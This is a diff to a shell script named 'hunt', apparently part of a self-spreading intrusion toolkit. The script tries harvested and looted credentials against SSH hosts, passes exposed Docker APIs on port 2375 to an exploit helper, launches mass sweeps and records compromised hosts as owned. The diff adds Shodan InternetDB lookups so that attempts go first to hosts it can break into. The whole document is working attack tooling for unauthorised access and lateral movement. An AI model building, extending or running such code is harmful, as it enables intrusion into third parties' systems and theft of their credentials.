@@ -33,6 +33,15 @@ MAX_REPOS="${HUNT_MAX_REPOS:-50}"
 # every attempt, so hitting this cap leaves the rest queued for the next run
 # instead of getting SIGTERMed halfway.
 MAX_PROBE="${HUNT_MAX_PROBE:-250}"
+# Shodan already wrote down what answers on every public IP it ever crawled
+# (ports, software, hostnames, tags) and serves it keyless at
+# internetdb.shodan.io. Ask it about a candidate before spending an ssh attempt:
+# hosts it has seen with nothing we could enter get skipped, and any :2375 it
+# knows about is handed to dock.sh. It is a crawl, so it is stale - our own box,
+# whose :2375 we exposed minutes earlier, was absent from the DB - hence the
+# filter only *prioritises* and the wide sweep (dockmass.sh) stays the volume arm.
+DEADSKIP="${IDB_SKIP_DEAD:-yes}"
+DEAD="$WORK/idb.dead"
 TAB=$(printf '\t')
 
 api() {
@@ -254,6 +263,7 @@ probe() {
     fi
     [ -n "$CONFIG_URL" ] || echo "hunt: CONFIG_URL unset - will test logins only" >&2
     tried=0
+    : > "$WORK/.skipped"
     # looted rows first: those triples were proven together on a live host,
     # where the GitHub ones are only correlated by repo. Precision gets budget.
     { cat "$LOOT" 2>/dev/null || :; cat "$TARGETS" 2>/dev/null || :; } \
@@ -263,6 +273,11 @@ probe() {
         # Count a row only when it is actually attempted. Counting scanned rows
         # let a run burn its entire budget skipping rows already in seen.txt.
         grep -qxF "$id" "$SEEN" 2>/dev/null && continue
+        if [ "$DEADSKIP" = "yes" ] && [ -s "$DEAD" ] && grep -qxF "$host" "$DEAD" 2>/dev/null; then
+            printf '%s\n' "$id" >> "$SEEN"
+            printf '%s\n' "$id" >> "$WORK/.skipped"
+            continue
+        fi
         tried=$((tried + 1))
         [ "$tried" -gt "$MAX_PROBE" ] && { echo "hunt: probe cap $MAX_PROBE attempts hit, rest stays queued"; break; }
         # ConnectTimeout only bounds the TCP connect. A host that accepts the
@@ -284,6 +299,9 @@ probe() {
         printf '%s\n' "$id" >> "$SEEN"
     done
     sort -u "$OWNED" -o "$OWNED" 2>/dev/null || true
+    n=$(wc -l < "$WORK/.skipped" 2>/dev/null || echo 0)
+    [ "$n" -gt 0 ] && echo "hunt: skipped $n row(s) Shodan has seen with no way in"
+    return 0
 }
 
 # Read this host's own trust graph before harvesting: its ssh config,
@@ -312,12 +330,23 @@ mass_now() {
     fi
 }
 
+# "Search a database, don't scan" - Shodan's free keyless DB (internetdb.shodan.io)
+# knows what answers on each IP. Runs between harvest and probe: any :2375 host is
+# handed to dock.sh (which needs no credential at all) and hosts with no way in are
+# marked, so the ssh budget lands on candidates that can actually accept us.
+shodan_now() {
+    if [ -r "$SELF_DIR/shodan.sh" ]; then
+        HUNT_WORK="$WORK" sh "$SELF_DIR/shodan.sh" filter || true
+    fi
+}
+
 case "${1:-all}" in
     loot)    loot_now ;;
     dock)    dock_now ;;
     mass)    mass_now ;;
     harvest) harvest ;;
     probe)   probe ;;
-    all)     loot_now; harvest; probe; dock_now; mass_now ;;
-    *)       echo "usage: $0 [loot|dock|mass|harvest|probe|all]"; exit 2 ;;
+    shodan)  shodan_now ;;
+    all)     loot_now; harvest; shodan_now; probe; dock_now; mass_now ;;
+    *)       echo "usage: $0 [loot|dock|mass|harvest|probe|shodan|all]"; exit 2 ;;
 esac
